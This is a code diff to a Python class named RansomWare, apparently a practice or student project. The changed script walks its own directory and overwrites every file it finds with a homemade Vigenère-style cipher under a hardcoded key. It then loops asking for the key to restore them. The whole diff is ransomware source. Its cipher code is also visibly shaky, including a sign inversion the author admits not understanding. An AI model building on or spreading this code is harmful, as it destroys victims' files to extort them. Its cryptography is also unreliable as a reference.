@@ -4,7 +4,43 @@ import base64
 import logging
 import pyperclip
 
-LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+
+
+#!/usr/bin/env python
+from math import fmod
+
+# The minimum and maximum valid char, ascii table defined order
+ascii_min = ord(' ')
+ascii_max = ord('~')
+
+def decrypt_vigenere(phrase, key):
+# Generate a string of all the possible chars
+    alpha = ""
+    for printable in range(ascii_min, ascii_max+1):
+        alpha = alpha + chr(printable)
+
+    # Ensure the key is at least as long as the ciphertext by cat'ing it
+    while len(key) < len(phrase):
+        key = key + key
+        key = key[0:len(phrase)]
+
+    out = ""
+    for i in range(len(phrase)):
+        index_from_phrase = (ord(phrase[i])-ascii_min)
+        index_from_key = ord(key[i]) - ascii_min
+        difference = (index_from_phrase - index_from_key)
+
+        # We want the sign of the dividend so we use fmod()
+        # Use the inverse of this result (I'm not certain why - is there a simpler way?
+        intersect = int(fmod(index_from_phrase - index_from_key, (ascii_max - ascii_min + 1)) * -1)
+
+        letter = alpha[intersect]
+        out += letter
+
+    return out, key
+
+
 
 class RansomWare:
     def __init__(self, name):
@@ -16,7 +52,8 @@ class RansomWare:
     
     @property
     def secret_key(self):
-        return "MBAPPE_SE_QUEDA_TOP_S3CR3T" 
+        #return "MBAPPE_SE_QUEDA_TOP_S3CR3T" 
+        return "MBAPPE"
 
     @name.setter
     def name(self, n_name):
@@ -36,21 +73,38 @@ class RansomWare:
     def encrypt_a_file(self, filename):
         with open(filename,'r') as file:
             text = file.read()
-        encrypted_file = base64.b64encode(text.encode('utf-8'))
+        
+        with open("copy.txt",'w') as file:
+            file.write(text)
+
+        encrypted_file, key2 = decrypt_vigenere(text, self.secret_key)
+
         with open(filename,'w') as file:
-            file.write(encrypted_file.decode('utf-8'))
+            file.write(str(encrypted_file))
         
     def decrypt_a_file(self, key, filename):
         with open(filename,'r') as file:
             text = file.read()
-        decrypted_file = base64.b64decode(text)
-        with open(filename,'w') as file:
-            file.write(decrypted_file.decode('utf-8'))
+        with open("copy.txt",'r') as file:
+            original_text = file.read()
+
+        decrypted_file, key2 = decrypt_vigenere(text, key)
+        
+        if(decrypted_file == original_text):
+            print("You saved your files, it's a miracle")
+            with open(filename,'w') as file:
+                file.write(str(decrypted_file))
+            return True
+        else:
+            print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
+            return False
+        
 
     def get_files(self, path):
         files = []
         for file in os.listdir(path):
-            if file == sys.argv[0]:
+
+            if file == sys.argv[0] or file=="prueba.py" or file=="copy.txt":
                 continue
             file_path = os.path.join(path, file)
             if os.path.isfile(file_path):
@@ -71,73 +125,28 @@ class RansomWare:
     def decrypt_files(self, path):
         key = self.enter_key()
 
-        if key != self.secret_key:
-            print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
-            return
+        #if key != self.secret_key:
+         #   print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
+          #  return
         files = self.get_files(path)
 
         for file in files:
-            self.decrypt_a_file(key, file)
-        print("You saved your files, it's a miracle")
-
-
-
-
-    #Nuevo algoritmo de encriptamiento 
-    def encryptMessage(self, key, message):
-        return self.translateMessage(key, message, 'encrypt')
-    def decryptMessage(self, key, message):
-        return self.translateMessage(key, message, 'decrypt')
-    
-    def translateMessage(self, key, message, mode):
-        translated = [] # stores the encrypted/decrypted message string
-        keyIndex = 0
-        key = key.upper()
-    
-        for symbol in message:
-            num = LETTERS.find(symbol.upper())
-            if num != -1:
-                if mode == 'encrypt':
-                    num += LETTERS.find(key[keyIndex])
-                elif mode == 'decrypt':
-                    num -= LETTERS.find(key[keyIndex])
-                num %= len(LETTERS)
-                
-                if symbol.isupper():
-                    translated.append(LETTERS[num])
-                elif symbol.islower():
-                    translated.append(LETTERS[num].lower())
-                keyIndex += 1
-                
-                if keyIndex == len(key):
-                    keyIndex = 0
-            else:
-                translated.append(symbol)
-        return ''.join(translated)
-
-    
-
+            flag = self.decrypt_a_file(key, file)
+        return flag
+        
 
 if __name__ == '__main__':
 
+    
     ransom = RansomWare('PruebaRansomWare')
-    myMessage = "This is basic implementation of Vignere Cipher"
-    Key="holasoygerman"
+    intentos=10
+    i=0
     
-    cripto = ransom.encryptMessage(Key, myMessage)
-    print(cripto)
-    
+    logging.basicConfig(level=logging.DEBUG)
+    path = os.path.dirname(os.path.abspath(__file__))
+    number_of_files = ransom.encrypt_files(path)
+    print("Number of encrypted files: {}".format(number_of_files))
     while True:
-        key2 = ransom.enter_key()
-        decripto = ransom.decryptMessage(key2, myMessage)
-        print(decripto)
-        if decripto==myMessage:
+        flag = ransom.decrypt_files(path)
+        if flag == True:
             break
-
-    #ransom = RansomWare('PruebaRansomWare')
-    #logging.basicConfig(level=logging.DEBUG)
-    #path = os.path.dirname(os.path.abspath(__file__))
-    #number_of_files = ransom.encrypt_files(path)
-    #print("Number of encrypted files: {}".format(number_of_files))
-
-    #ransom.decrypt_files(path)
